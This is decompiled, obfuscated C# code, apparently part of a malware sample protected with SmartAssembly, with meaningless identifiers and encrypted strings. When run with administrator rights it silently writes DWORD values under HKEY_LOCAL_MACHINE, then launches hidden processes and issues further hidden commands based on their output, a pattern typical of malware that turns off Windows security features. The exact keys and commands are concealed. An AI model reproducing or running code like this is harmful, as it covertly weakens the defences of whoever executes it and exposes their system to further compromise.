using System;
using System.Diagnostics;
using System.Security.Principal;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace GlIxuPPoosXGy;

public static class KIZCPcnPkivoQ
{
	[NonSerialized]
	internal static GetString getString_0;

	public static void pKhXdLzcGVGv()
	{
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			rJyQmzzlEjUm(getString_0(107407412), getString_0(107407351), getString_0(107389660));
			rJyQmzzlEjUm(getString_0(107407358), getString_0(107407297), getString_0(107407956));
			rJyQmzzlEjUm(getString_0(107407272), getString_0(107406639), getString_0(107407956));
			rJyQmzzlEjUm(getString_0(107407272), getString_0(107406602), getString_0(107407956));
			rJyQmzzlEjUm(getString_0(107407272), getString_0(107406597), getString_0(107407956));
			bMiyTVQvHDBxx();
		}
	}

	private static void rJyQmzzlEjUm(string string_0, string string_1, string string_2)
	{
		try
		{
			using RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(string_0, RegistryKeyPermissionCheck.ReadWriteSubTree);
			if (registryKey == null)
			{
				Registry.LocalMachine.CreateSubKey(string_0).SetValue(string_1, string_2, RegistryValueKind.DWord);
			}
			else if (registryKey.GetValue(string_1) != string_2)
			{
				registryKey.SetValue(string_1, string_2, RegistryValueKind.DWord);
			}
		}
		catch
		{
		}
	}

	private static void bMiyTVQvHDBxx()
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = getString_0(107392749),
			Arguments = getString_0(107406560),
			UseShellExecute = false,
			RedirectStandardOutput = true,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
		while (!process2.StandardOutput.EndOfStream)
		{
			string text = process2.StandardOutput.ReadLine();
			if (text.StartsWith(getString_0(107406523)) && text.EndsWith(getString_0(107406966)))
			{
				VsXDHhWlTyjJlV(getString_0(107406957));
			}
			else if (text.StartsWith(getString_0(107406639)) && text.EndsWith(getString_0(107406966)))
			{
				VsXDHhWlTyjJlV(getString_0(107406920));
			}
			else if (text.StartsWith(getString_0(107406851)) && text.EndsWith(getString_0(107406966)))
			{
				VsXDHhWlTyjJlV(getString_0(107406818));
			}
			else if (text.StartsWith(getString_0(107406753)) && text.EndsWith(getString_0(107406966)))
			{
				VsXDHhWlTyjJlV(getString_0(107406212));
			}
			else if (text.StartsWith(getString_0(107406151)) && text.EndsWith(getString_0(107406966)))
			{
				VsXDHhWlTyjJlV(getString_0(107406094));
			}
			else if (text.StartsWith(getString_0(107406037)) && text.EndsWith(getString_0(107406966)))
			{
				VsXDHhWlTyjJlV(getString_0(107405976));
			}
			else if (text.StartsWith(getString_0(107406427)) && text.EndsWith(getString_0(107406966)))
			{
				VsXDHhWlTyjJlV(getString_0(107406394));
			}
			else if (text.StartsWith(getString_0(107406297)) && text.EndsWith(getString_0(107406966)))
			{
				VsXDHhWlTyjJlV(getString_0(107406252));
			}
			else if (text.StartsWith(getString_0(107405695)) && text.EndsWith(getString_0(107406966)))
			{
				VsXDHhWlTyjJlV(getString_0(107405666));
			}
			else if (text.StartsWith(getString_0(107405605)) && !text.EndsWith(getString_0(107405576)))
			{
				VsXDHhWlTyjJlV(getString_0(107405571));
			}
			else if (text.StartsWith(getString_0(107405482)) && !text.EndsWith(getString_0(107389660)))
			{
				VsXDHhWlTyjJlV(getString_0(107405461));
			}
			else if (text.StartsWith(getString_0(107405960)) && !text.EndsWith(getString_0(107405927)))
			{
				VsXDHhWlTyjJlV(getString_0(107405922));
			}
			else if (text.StartsWith(getString_0(107405853)) && !text.EndsWith(getString_0(107405927)))
			{
				VsXDHhWlTyjJlV(getString_0(107405784));
			}
			else if (text.StartsWith(getString_0(107405719)) && !text.EndsWith(getString_0(107405927)))
			{
				VsXDHhWlTyjJlV(getString_0(107405174));
			}
			else if (text.StartsWith(getString_0(107405149)) && !text.EndsWith(getString_0(107405927)))
			{
				VsXDHhWlTyjJlV(getString_0(107405080));
			}
		}
	}

	public static void VsXDHhWlTyjJlV(string string_0)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = getString_0(107392749),
			Arguments = string_0,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	static KIZCPcnPkivoQ()
	{
		Strings.CreateGetStringDelegate(typeof(KIZCPcnPkivoQ));
	}
}
